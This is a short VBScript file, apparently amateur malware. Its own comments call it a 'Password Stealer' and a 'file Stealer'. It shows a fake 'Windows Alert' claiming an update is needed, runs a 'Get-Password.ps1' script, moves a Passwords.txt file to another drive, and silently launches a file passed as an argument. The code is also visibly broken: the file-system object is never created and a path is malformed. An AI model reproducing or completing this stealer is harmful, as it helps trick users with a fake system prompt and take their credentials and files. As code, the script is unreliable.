''' Loads dependancys
DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )

''' Alert Box
z=MsgBox("Your Windows PC requires an update... ", 0+64, "Windows Alert!!!")

''' Loads Password Stealer
CreateObject("Wscript.Shell").Run """Get-Password.ps1""", 1, True
FSO.MoveFile "Desktop\Passwords.txt\","D:\pass\"

''' Loads file Stealer
CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
